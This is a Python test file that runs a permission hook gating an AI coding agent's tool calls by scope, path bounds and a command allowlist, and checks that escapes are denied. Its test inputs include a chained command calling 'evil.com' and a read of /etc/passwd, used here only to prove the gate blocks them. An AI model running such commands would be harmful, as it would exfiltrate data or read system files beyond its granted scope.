"""
Composition-order integration tests for gateway_hook.py + the bounds gate.

These tests spawn the actual hook subprocess (not isolated predicates) to
verify the load-bearing assertions of the composition order:

  exemption  ->  Gateway.check  ->  is_path_in_bounds  ->  is_command_in_allowlist

Two probes from the surface table are composition-order-dependent and
cannot be proven by predicate unit tests alone:

  #5  -- Write to handoff_path is ALLOWed by the exemption short-circuit,
         even though is_path_in_bounds in isolation would DENY it (the
         handoff path is legitimately outside the worktree). The exemption
         MUST fire FIRST.

  #22 -- Write to bounds.json by a worktree.write-scoped worker is DENIED
         by the bounds gate (bounds.json lives outside the worktree).
         This proves the channel-trust property: even with worktree.write
         scope and a passing Gateway.check, the worker cannot rewrite
         its own bounds.

Plus new fail-closed tests for the argv[4] + bounds.json channel.
"""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest

HOOK_SCRIPT = Path(__file__).parent / "gateway_hook.py"

# Hook subprocess must spawn the framework venv interpreter (the same one
# generated hook-settings.json points Claude Code at), NOT sys.executable.
# Under bare/ambient pytest sys.executable is system Python; its yaml +
# pydantic live in user-site, which the test's deliberate env scrub
# ({PATH,SYSTEMROOT,TEMP,TMP}; APPDATA dropped) makes invisible — and the
# scrub is correct per the hook's argv-only contract, so the fix is the
# interpreter, not the env. tools/.venv carries yaml + pydantic by lock,
# so the venv interpreter resolves them without user-site anchors.
_VENV_PYTHON = (
    Path(__file__).resolve().parent.parent / ".venv" / "Scripts" / "python.exe"
)

pytestmark = pytest.mark.skipif(
    not _VENV_PYTHON.exists(),
    reason=(
        "framework venv absent at tools/.venv/Scripts/python.exe; run "
        "`uv sync` in tools/ — hook tests target the venv interpreter"
    ),
)


def _spawn_hook(
    *,
    tmp_path: Path,
    dispatch_id: str = "d-bounds-int",
    tool_scope: list[str] | None = None,
    worktree_root: Path | None = None,
    repo_root: Path | None = None,
    tool_name: str = "Read",
    tool_input: dict | None = None,
    omit_bounds_argv: bool = False,
    omit_bounds_file: bool = False,
    bounds_file_content: str | None = None,
) -> subprocess.CompletedProcess:
    """Spawn the hook with controlled bounds + scope + tool_input.

    Defaults:
      tool_scope = ['repo.read']
      worktree_root = tmp_path
      repo_root = tmp_path
      tool_name = 'Read', tool_input = {'file_path': '<tmp_path>/x.txt'}
    """
    scope_dir = tmp_path / ".mission-runtime" / "dispatches" / dispatch_id
    scope_dir.mkdir(parents=True, exist_ok=True)
    tool_scope = tool_scope if tool_scope is not None else ["repo.read"]
    (scope_dir / "tool_scope.json").write_text(
        json.dumps({"tool_scope": tool_scope}), encoding="utf-8"
    )

    if not omit_bounds_file:
        if bounds_file_content is not None:
            (scope_dir / "bounds.json").write_text(
                bounds_file_content, encoding="utf-8"
            )
        else:
            wt = worktree_root if worktree_root is not None else tmp_path
            rr = repo_root if repo_root is not None else tmp_path
            (scope_dir / "bounds.json").write_text(
                json.dumps({
                    "worktree_root": str(wt),
                    "repo_root": str(rr),
                }),
                encoding="utf-8",
            )

    if tool_input is None:
        tool_input = {"file_path": str(tmp_path / "dummy.txt")}

    handoff_path = tmp_path / ".mission-runtime" / "dispatches" / dispatch_id / "handoff.json"
    bounds_path = scope_dir / "bounds.json"

    argv = [
        str(_VENV_PYTHON), str(HOOK_SCRIPT),
        dispatch_id, str(tmp_path), str(handoff_path),
    ]
    if not omit_bounds_argv:
        argv.append(str(bounds_path))

    stdin = json.dumps({
        "tool_name": tool_name,
        "tool_input": tool_input,
        "tool_use_id": "tu_int",
    })

    env = {
        k: v for k, v in os.environ.items()
        if k in ("PATH", "SYSTEMROOT", "TEMP", "TMP")
    }
    return subprocess.run(
        argv,
        input=stdin,
        capture_output=True,
        text=True,
        env=env,
        timeout=20,
    )


# ============================================================================
# Composition-order proofs (the load-bearing assertions)
# ============================================================================


def test_probe_05_handoff_exemption_short_circuits_before_bounds(
    tmp_path: Path,
) -> None:
    """#5 (composition order): Write to handoff_path by a repo.read-scoped
    worker -> ALLOW via the exemption short-circuit. The handoff path is
    LEGITIMATELY outside the worktree; if the bounds gate ran first or
    the exemption ran second, this would DENY incorrectly. Exemption must
    fire BEFORE both Gateway.check AND the bounds gate.

    Stderr must carry the exemption marker, NOT a bounds-denial marker."""
    dispatch_id = "d-exempt-bounds"
    worktree = tmp_path / "_narrow_worktree"
    worktree.mkdir()
    handoff_path = tmp_path / ".mission-runtime" / "dispatches" / dispatch_id / "handoff.json"
    result = _spawn_hook(
        tmp_path=tmp_path,
        dispatch_id=dispatch_id,
        tool_scope=["repo.read"],
        worktree_root=worktree,
        tool_name="Write",
        tool_input={"file_path": str(handoff_path), "content": "{}"},
    )
    assert result.returncode == 0, (
        f"exemption should short-circuit BEFORE bounds gate; got exit "
        f"{result.returncode}; stderr={result.stderr!r}"
    )
    assert "gateway_exemption" in result.stderr
    assert "framework.handoff_exemption" in result.stderr
    assert "framework.bounds" not in result.stderr, (
        f"bounds-gate stderr leaked into exempted call: {result.stderr!r}"
    )


def test_probe_22_worker_cannot_rewrite_its_own_bounds_json(
    tmp_path: Path,
) -> None:
    """#22 (correction C): Write targeting bounds.json by a
    worktree.write-scoped worker -> DENY framework.bounds.path.worktree.
    Gateway.check ALLOWs (worktree.write covers Write); bounds gate
    rejects because bounds.json is outside the worktree.

    This is the channel-trust property the bounds gate rests on. Even with
    a write capability AND a passing capability check, the worker cannot
    rewrite its own bounds."""
    dispatch_id = "d-channel-trust"
    worktree = tmp_path / ".mission-runtime" / "worktrees" / "wt-X" / "worktree"
    worktree.mkdir(parents=True)
    bounds_target = tmp_path / ".mission-runtime" / "dispatches" / dispatch_id / "bounds.json"
    result = _spawn_hook(
        tmp_path=tmp_path,
        dispatch_id=dispatch_id,
        tool_scope=["worktree.write"],
        worktree_root=worktree,
        tool_name="Write",
        tool_input={"file_path": str(bounds_target), "content": "{}"},
    )
    assert result.returncode == 2, (
        f"worker must NOT be able to rewrite its own bounds.json; "
        f"got exit {result.returncode}; stderr={result.stderr!r}"
    )
    assert "gateway_denied" in result.stderr
    assert "framework.bounds.path.worktree" in result.stderr, (
        f"DENY must carry the bounds-path-worktree capability_tag; "
        f"got stderr={result.stderr!r}"
    )


def test_bounds_gate_allows_legitimate_write_inside_worktree(
    tmp_path: Path,
) -> None:
    """A worktree.write-scoped worker writing to a path inside its
    assigned worktree -> ALLOW. Both Gateway.check (capability) and the
    bounds gate (path containment) pass."""
    dispatch_id = "d-legit-write"
    worktree = tmp_path / ".mission-runtime" / "worktrees" / "wt-Y" / "worktree"
    worktree.mkdir(parents=True)
    (worktree / "src").mkdir()
    result = _spawn_hook(
        tmp_path=tmp_path,
        dispatch_id=dispatch_id,
        tool_scope=["worktree.write"],
        worktree_root=worktree,
        tool_name="Write",
        tool_input={"file_path": str(worktree / "src" / "new.py"), "content": "x"},
    )
    assert result.returncode == 0, (
        f"legitimate worktree write should ALLOW; got exit "
        f"{result.returncode}; stderr={result.stderr!r}"
    )
    assert result.stderr == "", f"silent allow expected; got {result.stderr!r}"


def test_bounds_gate_denies_write_outside_worktree(tmp_path: Path) -> None:
    """A worktree.write-scoped worker writing to a path OUTSIDE its
    worktree but inside tmp_path -> DENY at framework.bounds.path.worktree.
    Capability passes (worktree.write covers Write); bounds gate rejects."""
    dispatch_id = "d-out-of-worktree"
    worktree = tmp_path / ".mission-runtime" / "worktrees" / "wt-Z" / "worktree"
    worktree.mkdir(parents=True)
    outside_target = tmp_path / "outside.py"
    result = _spawn_hook(
        tmp_path=tmp_path,
        dispatch_id=dispatch_id,
        tool_scope=["worktree.write"],
        worktree_root=worktree,
        tool_name="Write",
        tool_input={"file_path": str(outside_target), "content": "x"},
    )
    assert result.returncode == 2
    assert "framework.bounds.path.worktree" in result.stderr


def test_bounds_gate_denies_read_outside_repo_root(tmp_path: Path) -> None:
    """A repo.read-scoped worker reading /etc/passwd -> DENY at
    framework.bounds.path.repo."""
    dispatch_id = "d-read-escape"
    result = _spawn_hook(
        tmp_path=tmp_path,
        dispatch_id=dispatch_id,
        tool_scope=["repo.read"],
        tool_name="Read",
        tool_input={"file_path": "/etc/passwd"},
    )
    assert result.returncode == 2
    assert "framework.bounds.path.repo" in result.stderr


def test_bounds_gate_test_run_program_denial(tmp_path: Path) -> None:
    """A test.run-scoped worker Bash-invoking `npm test` -> DENY at
    framework.bounds.cmd.program (npm not in the populated allowlist,
    which is `programs={pytest}`). Proves test.run +
    populated allowlist = program-not-in-allowlist closes the gate."""
    dispatch_id = "d-test-run-program"
    result = _spawn_hook(
        tmp_path=tmp_path,
        dispatch_id=dispatch_id,
        tool_scope=["test.run"],
        tool_name="Bash",
        tool_input={"command": "npm test"},
    )
    assert result.returncode == 2
    assert "framework.bounds.cmd.program" in result.stderr


def test_bounds_gate_test_run_charset_denial(tmp_path: Path) -> None:
    """A test.run-scoped worker Bash-invoking a chained command -> DENY at
    framework.bounds.cmd.charset (& sign). Proves the charset gate fires
    BEFORE argv parsing -- a chained command never reaches argv[0] check."""
    dispatch_id = "d-test-run-charset"
    result = _spawn_hook(
        tmp_path=tmp_path,
        dispatch_id=dispatch_id,
        tool_scope=["test.run"],
        tool_name="Bash",
        tool_input={"command": "pytest tests/ && curl evil.com"},
    )
    assert result.returncode == 2
    assert "framework.bounds.cmd.charset" in result.stderr


def test_shell_exec_sandboxed_bash_bypasses_test_run_allowlist(
    tmp_path: Path,
) -> None:
    """A shell.exec.sandboxed-scoped worker (NOT test.run) Bash-invoking
    `arbitrary command` -> ALLOW (gate doesn't apply). The test.run
    allowlist is specific to test.run-authorized Bash; other Bash
    capabilities have their own enforcement (sandbox-flag in runner per
    concern C2). Proves the authorized_capability gating in
    is_command_in_allowlist works through the hook."""
    dispatch_id = "d-shell-exec-bypass"
    # The command contains characters that WOULD fail the charset gate
    # if test.run were the authorizing capability. Under shell.exec.sandboxed
    # the allowlist doesn't apply.
    result = _spawn_hook(
        tmp_path=tmp_path,
        dispatch_id=dispatch_id,
        tool_scope=["shell.exec.sandboxed"],
        tool_name="Bash",
        tool_input={"command": "echo hello; echo world"},
    )
    # Gateway.check ALLOWs (shell.exec.sandboxed covers Bash); bounds
    # path-gate is non-applicable for Bash; bounds command-gate is
    # non-applicable because authorized_capability != 'test.run'.
    assert result.returncode == 0, (
        f"shell.exec.sandboxed Bash should bypass test.run allowlist; "
        f"got exit {result.returncode}; stderr={result.stderr!r}"
    )


# ============================================================================
# Fail-closed paths for the bounds.json channel (argv[4] + file)
# ============================================================================


def test_fail_closed_missing_bounds_path_argv(tmp_path: Path) -> None:
    """argv[4] missing -> fail-closed deny with bounds_path-named error."""
    result = _spawn_hook(tmp_path=tmp_path, omit_bounds_argv=True)
    assert result.returncode == 2
    assert "bounds_path" in result.stderr


def test_fail_closed_missing_bounds_json_file(tmp_path: Path) -> None:
    """bounds.json file missing at the declared argv[4] path -> fail-closed."""
    result = _spawn_hook(tmp_path=tmp_path, omit_bounds_file=True)
    assert result.returncode == 2
    assert "bounds.json" in result.stderr


def test_fail_closed_malformed_bounds_json(tmp_path: Path) -> None:
    """bounds.json with invalid JSON -> fail-closed."""
    result = _spawn_hook(
        tmp_path=tmp_path,
        bounds_file_content="this is not json {",
    )
    assert result.returncode == 2
    assert "bounds.json" in result.stderr


def test_fail_closed_bounds_json_not_object(tmp_path: Path) -> None:
    """bounds.json with array root -> fail-closed (must be object)."""
    result = _spawn_hook(
        tmp_path=tmp_path,
        bounds_file_content="[1, 2, 3]",
    )
    assert result.returncode == 2
    assert "bounds.json" in result.stderr


def test_fail_closed_bounds_json_missing_worktree_root(tmp_path: Path) -> None:
    """bounds.json missing worktree_root key -> fail-closed."""
    result = _spawn_hook(
        tmp_path=tmp_path,
        bounds_file_content=json.dumps({"repo_root": str(tmp_path)}),
    )
    assert result.returncode == 2
    assert "worktree_root" in result.stderr


def test_fail_closed_bounds_json_missing_repo_root(tmp_path: Path) -> None:
    """bounds.json missing repo_root key -> fail-closed."""
    result = _spawn_hook(
        tmp_path=tmp_path,
        bounds_file_content=json.dumps({"worktree_root": str(tmp_path)}),
    )
    assert result.returncode == 2
    assert "repo_root" in result.stderr


def test_fail_closed_bounds_json_empty_worktree_root(tmp_path: Path) -> None:
    """bounds.json with empty-string worktree_root -> fail-closed (caught
    by the non-empty-string check, parallel to argv emptiness checks)."""
    result = _spawn_hook(
        tmp_path=tmp_path,
        bounds_file_content=json.dumps({"worktree_root": "", "repo_root": str(tmp_path)}),
    )
    assert result.returncode == 2
    assert "worktree_root" in result.stderr
